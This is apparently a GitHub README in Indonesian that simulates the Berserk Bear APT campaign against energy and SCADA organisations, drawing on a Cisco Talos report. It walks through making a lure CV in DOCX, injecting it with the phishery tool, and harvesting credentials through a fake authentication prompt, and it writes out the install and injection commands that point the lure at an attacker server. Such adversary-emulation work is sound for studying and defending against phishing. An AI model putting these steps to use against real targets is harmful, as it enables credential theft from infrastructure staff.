# Simulasi Serangan Berserk Bear APT

Ini adalah simulasi serangan oleh grup APT (Berserk Bear) yang menargetkan infrastruktur kritis dan perusahaan energi di seluruh dunia, terutama di Eropa dan Amerika Serikat. Kampanye serangan ini aktif setidaknya sejak Mei 2017. Serangan ini menargetkan penyedia infrastruktur kritis dan vendor yang mereka gunakan untuk menyediakan layanan penting. Rantai serangan dimulai dengan **kontainer XML berbahaya** yang disuntikkan ke dalam file DOCX, yang terhubung ke server eksternal melalui (SMB) dan digunakan untuk diam-diam mengambil kredensial pengguna, lalu digunakan dalam serangan spear-phishing. Saya mengandalkan laporan dari [Cisco Talos Intelligence Group](https://blog.talosintelligence.com/template-injection/) untuk memahami detailnya dan membuat simulasi ini.

![1](https://github.com/user-attachments/assets/065c0287-a730-42d3-8933-60369123cb3e)


Jika Anda ingin mengetahui lebih lanjut tentang serangan oleh grup APT Berserk Bear, lihat di sini: [ETDA Berserk Bear Card](https://apt.etda.or.th/cgi-bin/showcard.cgi?g=Berserk%20Bear%2C%20Dragonfly%202%2E0&n=1)

Serangan ini meliputi beberapa tahap, termasuk penyuntikan file DOCX dan penggunaan kontainer XML berbahaya yang memicu notifikasi untuk memperoleh kredensial yang kemudian ditransfer ke server penyerang. Kredensial ini digunakan oleh penyerang untuk mengakses data organisasi yang menjadi target serangan spear-phishing. File DOCX berupa CV ini dibuat untuk orang dengan pengalaman sepuluh tahun dalam pengembangan perangkat lunak dan sistem kontrol SCADA.

1. Buat file DOCX CV yang akan disuntikkan dan dikirim melalui spear phishing.

2. Lakukan penyuntikan pada file DOCX untuk memperoleh kredensial menggunakan alat phishery.

3. Phishing Kredensial terjadi ketika target membuka file Word dan memasukkan kredensial dalam notifikasi yang akan ditampilkan.


## Tahap Pertama (teknik pengiriman)

Penyerang menargetkan institusi yang terkait dengan energi dan sistem manajemen energi seperti SCADA. Mereka membuat file DOCX dalam bentuk CV untuk melamar pekerjaan, tampaknya ada lowongan pekerjaan terbuka untuk posisi tersebut. Penyerang mengirimkan CV yang berisi kontainer XML berbahaya. Di sini, saya membuat CV identik dengan yang digunakan dalam serangan asli.

![2](https://github.com/user-attachments/assets/c75ca289-67e6-4738-96cb-94fafec06fc9)



## Tahap Kedua (teknik implantasi)

Menurut Cisco Talos Intelligence Group, penyerang menyuntikkan file DOCX melalui alat phishery. Pada saat serangan ini, phishery merupakan alat baru, dan para penyerang memanfaatkan momen tersebut. Mungkin mereka juga melakukan beberapa modifikasi sebelum menggunakannya dalam serangan ini.

![3](https://github.com/user-attachments/assets/7876cae9-fa2b-412b-8b02-1f8a367f8403)


Phishery adalah server HTTP yang sederhana dengan SSL, dirancang untuk tujuan utama phishing kredensial melalui Otentikasi Dasar. Phishery juga memungkinkan penyuntikan URL ke dalam dokumen Word (.docx) dengan mudah.

Repository Github: https://github.com/ryhanson/phishery.git

![4](https://github.com/user-attachments/assets/a49b4a2d-e7d5-4aa2-b33a-df937c880623)


Berikut adalah perintah untuk menginstal dan menggunakan phishery:
`sudo apt-get install phishery`

`phishery -u https://192.168.138.138 -i CV.docx -o malicious.docx`

`phishery`

Sekarang, CV berbahaya akan dikirim ke target dan menunggu kredensial.

## Tahap Ketiga (teknik eksekusi)

Phishing Kredensial terjadi ketika target membuka file Word yang berbahaya dan memasukkan kredensial dalam notifikasi yang akan ditampilkan kepada mereka.



https://github.com/user-attachments/assets/ee6e44cd-c827-42eb-8d0a-02c93c01e1fb


